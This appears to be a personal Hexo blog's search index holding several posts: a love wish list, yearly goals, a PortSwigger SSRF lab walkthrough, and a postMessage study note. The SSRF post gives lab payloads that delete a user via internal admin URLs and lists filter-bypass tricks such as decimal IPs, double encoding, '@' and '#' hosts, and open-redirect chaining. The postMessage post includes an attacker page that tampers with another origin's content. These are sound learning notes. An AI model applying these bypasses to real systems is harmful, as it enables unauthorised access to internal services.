<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>LOVE0011016- 我想</title>
      <link href="/2024/02/04/%E6%9D%82%E8%B0%88/LOVE001016/"/>
      <url>/2024/02/04/%E6%9D%82%E8%B0%88/LOVE001016/</url>
      
        <content type="html"><![CDATA[<h1 align="center">LOVE0011016- 我想</h1><blockquote><p>纤云弄巧，飞星传恨，银汉迢迢暗度。金风玉露一相逢，便胜却人间无数。<br>柔情似水，佳期如梦，忍顾鹊桥归路！两情若是久长时，又岂在朝朝暮暮。</p><p>希望和小婉一直好好的,小婉真的是一个很宝藏的女生，一定要对小婉好！！！！</p></blockquote><ul><li><input disabled="" type="checkbox"> 我想和你每天都见面</li><li><input disabled="" type="checkbox"> 我想和你三餐一起吃</li><li><input disabled="" type="checkbox"> 我想和你牵手散步</li><li><input disabled="" type="checkbox"> 我想和你一起挤公交</li><li><input disabled="" type="checkbox"> 我想和你一起坐地铁</li><li><input disabled="" type="checkbox"> 我想和你看感人的电影</li><li><input disabled="" type="checkbox"> 我想和你分享美味</li><li><input disabled="" type="checkbox"> 我想和你一起赖床</li><li><input disabled="" type="checkbox"> 我想和你酒后吐露心声</li><li><input disabled="" type="checkbox"> 我想和你去夜晚的后海</li><li><input disabled="" type="checkbox"> 我想和你一起啃西瓜像豌豆射手一样吐籽</li><li><input disabled="" type="checkbox"> 我想和你一起发呆</li><li><input disabled="" type="checkbox"> 我想和你窝在沙发看肥皂剧</li><li><input disabled="" type="checkbox"> 我想和你一起旅行</li><li><input disabled="" type="checkbox"> 我想和你在山顶上看最早的日出</li><li><input disabled="" type="checkbox"> 我想和你见最美的极光</li><li><input disabled="" type="checkbox"> 我想和你拍好多好看的合照</li><li><input disabled="" type="checkbox"> 我想和你一起赏雪</li><li><input disabled="" type="checkbox"> 我想和你一起共白头</li><li><input disabled="" type="checkbox"> 我想和你在巨大的雪坡上滑雪</li><li><input disabled="" type="checkbox"> 我想和你一起吃火锅</li><li><input disabled="" type="checkbox"> 我想和你一起吃小婉最喜欢的蛋糕</li><li><input disabled="" type="checkbox"> 我想和你泡温泉</li><li><input disabled="" type="checkbox"> 我想和你一起堆雪人</li><li><input disabled="" type="checkbox"> 我想和你一起去看星星</li><li><input disabled="" type="checkbox"> 我想和你一起去捡贝壳</li><li><input disabled="" type="checkbox"> 我想和你一起淋雨</li><li><input disabled="" type="checkbox"> 我想和你养猫</li><li><input disabled="" type="checkbox"> 我想和你一起放孔明灯</li><li><input disabled="" type="checkbox"> 我想和你有一个属于我们的小窝</li><li><input disabled="" type="checkbox"> 我想和你一起吃冰淇淋</li><li><input disabled="" type="checkbox"> 我想和你一起去动物园</li><li><input disabled="" type="checkbox"> 我想和你一起在树荫下乘凉</li><li><input disabled="" type="checkbox"> 我想和你一起去看演唱会</li><li><input disabled="" type="checkbox"> 我想和你一起穿情侣装</li><li><input disabled="" type="checkbox"> 我想和你一起在羊肠小道散步哼唱</li><li><input disabled="" type="checkbox"> 我想和你一起度过一年一年的生日</li><li><input disabled="" type="checkbox"> 我想和你一起赏月</li><li><input disabled="" type="checkbox"> 我想和你亲吻亲到拉丝</li><li><input disabled="" type="checkbox"> 我想和你永远在一起</li><li><input disabled="" type="checkbox"> 我想和你快快乐乐</li><li><input disabled="" type="checkbox"> 我想和你得到所有人的祝福</li><li><input disabled="" type="checkbox"> 我想和你一起面对父母</li><li><input disabled="" type="checkbox"> 我想和你做很多很多的事情……..</li></ul><h1 id="我想我们相爱彼此，宽容彼此，接受最真实的彼此"><a href="#我想我们相爱彼此，宽容彼此，接受最真实的彼此" class="headerlink" title="我想我们相爱彼此，宽容彼此，接受最真实的彼此"></a>我想我们相爱彼此，宽容彼此，接受最真实的彼此</h1>]]></content>
      
      
      <categories>
          
          <category> 我想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 目标 </tag>
            
            <tag> 我想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>portswigger_ssrf</title>
      <link href="/2024/02/02/%E9%9D%B6%E5%9C%BA/portswigger/SSRF/"/>
      <url>/2024/02/02/%E9%9D%B6%E5%9C%BA/portswigger/SSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="Basic-SSRF-against-the-local-server"><a href="#Basic-SSRF-against-the-local-server" class="headerlink" title="Basic SSRF against the local server"></a>Basic SSRF against the local server</h1><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><ul><li>抓到存在url的包，尝试ssrf</li></ul><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021549509.png" alt="image-20240202154937413" style="zoom:50%;" /><ul><li>替换url</li></ul><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021550518.png" alt="image-20240202155025432" style="zoom:50%;" /><ul><li>拼接合适的删除url<code>stockApi=http://localhost/admin/delete?username=carlos</code>,解决</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021551100.png" alt="image-20240202155139030"></p><h1 id="Basic-SSRF-against-another-back-end-system（针对另一个后端系统的基本SSRF）"><a href="#Basic-SSRF-against-another-back-end-system（针对另一个后端系统的基本SSRF）" class="headerlink" title="Basic SSRF against another back-end system（针对另一个后端系统的基本SSRF）"></a>Basic <a href="https://portswigger.net/web-security/ssrf">SSRF</a> against another back-end system（针对另一个后端系统的基本SSRF）</h1><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><ul><li>抓包看到有一个内网地址，192.168.0.1</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021607697.png"></p><ul><li>在后面拼接admin返回错误</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021608978.png" alt="image-20240202160815904"></p><ul><li>遍历198.168.0.1-255找到另外一个内网地址</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021613760.png" alt="image-20240202161344681"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021614733.png" alt="image-20240202161400650"></p><ul><li>找到内网地址加入参数<code>stockApi=http://192.168.0.89:8080/admin/delete?username=carlos</code></li></ul><h1 id="SSRF-with-blacklist-based-input-filter-具有基于黑名单的输入过滤器的SSRF"><a href="#SSRF-with-blacklist-based-input-filter-具有基于黑名单的输入过滤器的SSRF" class="headerlink" title="SSRF with blacklist-based input filter(具有基于黑名单的输入过滤器的SSRF)"></a>SSRF with blacklist-based input filter(具有基于黑名单的输入过滤器的SSRF)</h1><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul><li>使用<code>127.0.0.1</code>的替代IP表示，例如<code>2130706433</code>、<code>017700000001</code>或<code>127.1</code>（十进制，八进制表示）</li><li>注册您自己的域名，解析为<code>127.0.0.1</code></li><li>使用URL编码或大小写变化混淆被阻止的字符串</li><li>提供您控制的URL，该URL重定向到目标URL。尝试使用不同的重定向代码，以及目标URL的不同协议。例如，在重定向期间从<code>http:</code>切换到<code>https:</code> URL已经被证明可以绕过一些反SSRF过滤器。</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li><p>抓包用url双编码绕过<code>stockApi=http://127.1/%2561dmin</code>把字母a两次url编码</p></li><li><p>删除的url<code>stockApi=http://127.1/%2561dmin/delete?username=carlos</code></p></li></ul><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021642896.png" alt="image-20240202164202819" style="zoom:50%;" /><h1 id="SSRF-with-whitelist-based-input-filter（具有基于白名单的输入过滤器的SSRF）"><a href="#SSRF-with-whitelist-based-input-filter（具有基于白名单的输入过滤器的SSRF）" class="headerlink" title="SSRF with whitelist-based input filter（具有基于白名单的输入过滤器的SSRF）"></a>SSRF with whitelist-based input filter（具有基于白名单的输入过滤器的SSRF）</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><ul><li><p>您可以使用<code>#</code>字符来表示URL片段。举例来说：<code>https://evil-host#expected-host</code></p></li><li><p>您可以使用<code>@</code>字符在URL中的主机名之前嵌入凭据。举例来说：<code>https://expected-host:fakepassword@evil-host</code></p></li><li><p>您可以利用DNS命名层次结构将所需的输入放入您控制的完全限定的DNS名称中。举例来说：<code>https://expected-host.evil-host</code></p></li><li><p>多种绕过方式结合：<code>https://evil-host%2523@expected-host</code>（其中的%2523是表示#，就是evil-host#@expected-host）</p></li></ul><h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h2><ul><li><p>抓包试试@能不能绕过</p></li><li><p>原本是<code>http://stock.weliketoshop.net:8080/product/stock/check?productId=1%26storeId=1</code>插入@字符<code>http://11212@stock.weliketoshop.net:8080/product/stock/check?productId=1%26storeId=1</code>发现@可用,就是url支持嵌入式凭据</p></li></ul><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021719044.png" alt="image-20240202171923992" style="zoom:50%;" /><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021705606.png" style="zoom:50%;" /><ul><li>再尝试#,发现报错,进行双编码绕过,再尝试前面嵌入127.1<code>stockApi=http://127.1%25%32%33@stock.weliketoshop.net/admin</code></li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021722032.png" alt="image-20240202172224949"></p><h1 id="SSRF-with-filter-bypass-via-open-redirection-vulnerability-SSRF通过开放重定向漏洞实现过滤器旁路"><a href="#SSRF-with-filter-bypass-via-open-redirection-vulnerability-SSRF通过开放重定向漏洞实现过滤器旁路" class="headerlink" title="SSRF with filter bypass via open redirection vulnerability(SSRF通过开放重定向漏洞实现过滤器旁路)"></a>SSRF with filter bypass via open redirection vulnerability(SSRF通过开放重定向漏洞实现过滤器旁路)</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><ul><li>在前面的例子中，假设用户提交的URL经过严格验证，以防止SSRF行为的恶意利用。但是，允许其URL的应用程序包含一个开放的重定向漏洞。如果用于生成后端HTTP请求的API支持重定向，则可以构造一个满足过滤器的URL，并将请求重定向到所需的后端目标.也就是说利用重定向访问从而实现ssrf</li><li>例子<code>stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin</code>这个会跳转到访问<code>http://192.168.0.68/admin</code></li><li>这个SSRF漏洞是有效的，因为应用程序首先验证提供的<code>stockAPI</code> URL是否在允许的域中，它确实是。然后，应用程序请求提供的URL，这将触发开放重定向。它遵循重定向，并向攻击者选择的内部URL发出请求。</li></ul><h2 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h2><ul><li>抓包找到一个有重定向的请求包</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021731275.png"></p><ul><li><p>观察这个请求包,我们看到存在一个<code>/product/nextProduct</code>接口,我们把<code>path</code>的地址换成<code>http://192.168.0.12:8080/admin</code>发现是无法访问的,但是我们可将两个点结合</p></li><li><p>先测试一下这个接口是否有重定向的漏洞,看到dnslog带出了</p></li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021742642.png"></p><ul><li>接着我们在访问价格的请求包中的<code>stockApi</code>拼接这个接口并且访问内网地址<code>stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin</code></li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021743155.png" alt="22"></p><ul><li>访问<code>stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos</code>删除用户</li></ul><h1 id="Blind-SSRF-with-out-of-band-detection-具有带外检测的盲SSRF"><a href="#Blind-SSRF-with-out-of-band-detection-具有带外检测的盲SSRF" class="headerlink" title="Blind SSRF with out-of-band detection(具有带外检测的盲SSRF)"></a>Blind SSRF with out-of-band detection(具有带外检测的盲SSRF)</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><ul><li>使用带外技术最简单、最有效的方法是使用<a href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a>。您可以使用<a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a>来生成唯一的域名，将其作为有效负载发送到应用程序，并监视与这些域的任何交互。如果观察到来自应用程序的传入HTTP请求，则它易受SSRF攻击。</li></ul><h2 id="WP-2"><a href="#WP-2" class="headerlink" title="WP"></a>WP</h2><ul><li>抓包更改请求头referer参数</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021751446.png"></p><ul><li>带出http访问</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021756146.png" alt="image-20240202175657090"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场-portswigger </category>
          
      </categories>
      
      
        <tags>
            
            <tag> portswigger </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Postmessage学习</title>
      <link href="/2024/01/30/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/Postmessage%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/01/30/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/Postmessage%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 align ="center">Postmessage学习 </h1><h1 id="PostMessage"><a href="#PostMessage" class="headerlink" title="PostMessage"></a>PostMessage</h1><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><blockquote><p><code>postMessage</code> 是一个用于在不同窗口或文档之间进行安全跨域通信的 Web API 方法。它允许一个窗口或 iframe 向另一个窗口或 iframe 发送消息，即使这些窗口或 iframe 不在同一个域中也可以安全使用。这是为了避免跨域限制而设计的一种机制。</p></blockquote><ul><li>基本语法如下：<br><code>otherWindow.postMessage(message, targetOrigin, [transfer]);</code><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">otherWindow: 目标窗口的引用，可以是另一个窗口、iframe 或者其他支持 postMessage 的对象。</span><br><span class="line">message: 要发送的消息数据，可以是字符串、数字、对象等。</span><br><span class="line">targetOrigin: 表示目标窗口的源（origin），这是一个字符串。如果你知道目标窗口的源，可以提供它，以增加安全性。可以是具体的源（例如，&quot;https://example.com&quot;），或者通配符 &quot;*&quot; 表示允许来自任意源的消息。</span><br><span class="line">transfer (可选): 一个可选的数组，包含要在消息中传递的 Transferable 对象，如 ArrayBuffer。</span><br><span class="line"></span><br><span class="line">在发送端，你可以使用 postMessage 将消息发送到目标窗口：</span><br><span class="line">const targetWindow = document.getElementById(&quot;target&quot;).contentWindow;</span><br><span class="line">targetWindow.postMessage(&quot;Hello, this is a message!&quot;, &quot;https://example.com&quot;);</span><br><span class="line"></span><br><span class="line">在接收端，你可以通过在 window 上监听 &quot;message&quot; 事件来捕获发送的消息：</span><br><span class="line">window.addEventListener(&quot;message&quot;, (event) =&gt; &#123;</span><br><span class="line">  // 处理接收到的消息</span><br><span class="line">  const receivedMessage = event.data;</span><br><span class="line">  console.log(receivedMessage);</span><br><span class="line">&#125;, false);</span><br><span class="line">这种机制通常用于在同一域之间的不同窗口或 iframe 之间进行通信，例如在父窗口和嵌套的 iframe 之间。</span><br></pre></td></tr></table></figure></li></ul><h2 id="演示代码"><a href="#演示代码" class="headerlink" title="演示代码"></a>演示代码</h2><ul><li>demo1.html</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line"> &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function openChild() &#123;</span><br><span class="line">    child = window.open(&#x27;demo2.html&#x27;, &#x27;popup&#x27;, &#x27;height=300px, width=500px&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">function sendMessage()&#123;</span><br><span class="line">    //发送的数据内容</span><br><span class="line">    let msg=&#123;pName : &quot;jack&quot;, pAge: &quot;12&quot;&#125;;</span><br><span class="line">    //发送消息数据数据到任意目标源, *指的是任意anyone</span><br><span class="line">    child.postMessage(msg,&#x27;*&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;fieldset&gt;</span><br><span class="line">            &lt;input type=&#x27;button&#x27; id=&#x27;btnopen&#x27; value=&#x27;Open child&#x27; onclick=&#x27;openChild();&#x27; /&gt;</span><br><span class="line">            &lt;input type=&#x27;button&#x27; id=&#x27;btnSendMsg&#x27; value=&#x27;Send Message&#x27; onclick=&#x27;sendMessage();&#x27; /&gt;</span><br><span class="line">        &lt;/fieldset&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>demo2.html</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        //添加事件监控消息</span><br><span class="line">    window.addEventListener(&quot;message&quot;, (event)=&gt;&#123;</span><br><span class="line">        let txt=document.getElementById(&quot;msg&quot;);</span><br><span class="line">        //接收传输过来的变量数据</span><br><span class="line">        txt.value=`Name is $&#123;event.data.pName&#125; Age is  $&#123;event.data.pAge&#125;` ;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;h1&gt;postMessage学习&lt;/h1&gt;</span><br><span class="line">        &lt;input type=&#x27;text&#x27; id=&#x27;msg&#x27;/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>效果</li></ul><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202401301354143.png" style="zoom:50%;" /><h1 id="危害演示"><a href="#危害演示" class="headerlink" title="危害演示"></a>危害演示</h1><ul><li>我们从本地创建直接访问hacker.html代码就可以串改deom2网页的内容</li><li>这里要使用setimeout函数，因为这样我猜是window.open 方法通常是异步的，它会在后台加载新文档，而不会等待文档完全加载。因此，使用 setTimeout 会等待一段时间，以确保新文档已经准备好接收消息。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line"> &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">childwin = window.open(&#x27;http://119.45.227.86/postmessage/demo2.html&#x27;);</span><br><span class="line"></span><br><span class="line">function sendMessage()&#123;</span><br><span class="line">    let msg=&#123;pName : &quot;attacker&quot;, pAge: &quot;16&quot;&#125;;</span><br><span class="line">    childwin.postMessage(msg,&#x27;*&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(function()&#123;setTimeout(&quot;sendMessage()&quot;,1000);&#125;()); </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202401301410735.png" alt="image-20240130141053689"></p><ul><li>对于存在跳转漏洞即是herf跳转的，具体可以查看DOM-XSS靶场中的漏洞</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习日志 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年计划</title>
      <link href="/2024/01/05/%E6%9D%82%E8%B0%88/2024%E5%B9%B4%E7%9B%AE%E6%A0%87/"/>
      <url>/2024/01/05/%E6%9D%82%E8%B0%88/2024%E5%B9%B4%E7%9B%AE%E6%A0%87/</url>
      
        <content type="html"><![CDATA[<h1 align="center">2024年计划</h1><h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><blockquote><p>今天看了一天视频学了Hexo搭建博客，现在稍微懂一些吧。其实git还不是很懂，也是第一次发博客，花了一天的时间，希望这个博客也是让我坚持学习的动力吧（毕竟我是一个不怎么坚定的人）<br>第一个博客也是制定一下2024年的计划吧</p></blockquote><h1 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h1><h2 id="1-首先把企业src漏洞挖明，真的要好好专研门道！"><a href="#1-首先把企业src漏洞挖明，真的要好好专研门道！" class="headerlink" title="1.首先把企业src漏洞挖明，真的要好好专研门道！"></a>1.首先把<code>企业src漏洞挖明</code>，真的要好好专研门道！</h2><h2 id="2-尝试接触红队，起码看完红队笔记，试着打打HTB"><a href="#2-尝试接触红队，起码看完红队笔记，试着打打HTB" class="headerlink" title="2.尝试接触红队，起码看完红队笔记，试着打打HTB"></a>2.尝试接触红队，起码看完红队笔记，试着打打HTB</h2><h2 id="3-CTF看看能不能试着拿个奖"><a href="#3-CTF看看能不能试着拿个奖" class="headerlink" title="3.CTF看看能不能试着拿个奖"></a>3.CTF看看能不能试着拿个奖</h2><h2 id="4-保持情绪稳定，知行合一，尽量每天都学新知识写笔记"><a href="#4-保持情绪稳定，知行合一，尽量每天都学新知识写笔记" class="headerlink" title="4.保持情绪稳定，知行合一，尽量每天都学新知识写笔记"></a>4.保持<code>情绪稳定</code>，<code>知行合一</code>，尽量每天都学新知识写笔记</h2><h2 id="5-减肥！减肥！减肥！"><a href="#5-减肥！减肥！减肥！" class="headerlink" title="5.减肥！减肥！减肥！"></a>5.减肥！减肥！减肥！</h2>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 目标 </tag>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码演示</title>
      <link href="/2024/01/05/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/%E6%BC%94%E7%A4%BA/"/>
      <url>/2024/01/05/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/%E6%BC%94%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<pre><code class="javascript">    funtion a()&#123;        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        vconsole.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)    &#125;</code></pre>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
